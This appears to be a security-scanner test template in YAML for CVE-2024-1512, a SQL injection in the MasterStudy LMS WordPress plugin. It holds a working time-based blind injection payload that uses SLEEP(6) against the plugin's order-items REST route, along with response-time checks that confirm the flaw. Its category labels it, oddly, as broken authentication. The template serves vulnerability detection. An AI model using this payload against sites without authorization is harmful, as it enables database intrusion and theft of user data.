id: MASTERSTUDY_LMS_WORDPRESS_PLUGIN_SQL_INJECTION
info:
  name: "MasterStudy LMS WordPress Plugin SQL Injection"
  description: > 
    "This vulnerability affects the MasterStudy LMS plugin, allowing attackers to inject malicious SQL queries through insecure input fields. This flaw can lead to unauthorized access or manipulation of the WordPress database, potentially exposing sensitive data or compromising site integrity. Exploiting this vulnerability can severely impact the security of the Learning Management System and the confidentiality of user information."
  details: >
    "This vulnerability involves a flaw in the MasterStudy LMS plugin that permits attackers to exploit unsanitized input fields. By injecting malicious SQL queries, attackers can manipulate the underlying database, leading to unauthorized data access or modification. This vulnerability can affect versions of the plugin where input validation and SQL query preparation are inadequate, posing significant risks to site security and data integrity."
  impact: >
    "The impact of this vulnerability includes potential unauthorized access to or modification of the database. Attackers could extract sensitive user information, such as personal details and educational data, or alter database contents. This can lead to privacy breaches, data loss, and significant disruption to the Learning Management System's functionality and security."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: MASTERSTUDY_LMS_WORDPRESS_PLUGIN_SQL_INJECTION
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-89
  cve:
    - CVE-2024-1512


api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  url:
    extract: urlVar
  request_headers:
    for_one:
      key:
        eq: content-type
        extract: contentTypeHeader

execute:
  type: multiple
  requests:
  - req: 
    - add_header:
        dummyHeader: a
    - validate:
        response_code:
          gte: 200
          lt: 300
        response_payload:
          length:
            gt: 0
          not_contains:
            - Error
            - Internal Server 
            - Failed
            - Unauthorized
            - access denied
            - Forbidden
            - Method Not allowed
            - Gateway timeout
            - request timeout
            - server error
            - server busy
            - authentication error
            - authorization error
            - validation error
            - Permission Denied
            - invalid token
            - token expired
            - session expired
            - session timeout
            - unexpected error
            - unable to process request
            - bad request
            - service unavailable
            - account is locked
            - account is blocked
            - multiple failed attempts
    - success: x2
    - failure: exit
  - req:
    - modify_method: GET
    - modify_url: ${urlVar}/?rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%286%29%29%29sauT%29+AND+%283071%3D3071
    - replace_body: '{}'  
    - validate:
        response_code:
          gt: 505      
validate:
  and:
    - compare_greater:
        - ${x2.response.stats.median_response_time}
        - 4001
    - compare_greater:
        - ${x2.response.stats.median_response_time}
        - ${x1.response.stats.median_response_time} * 3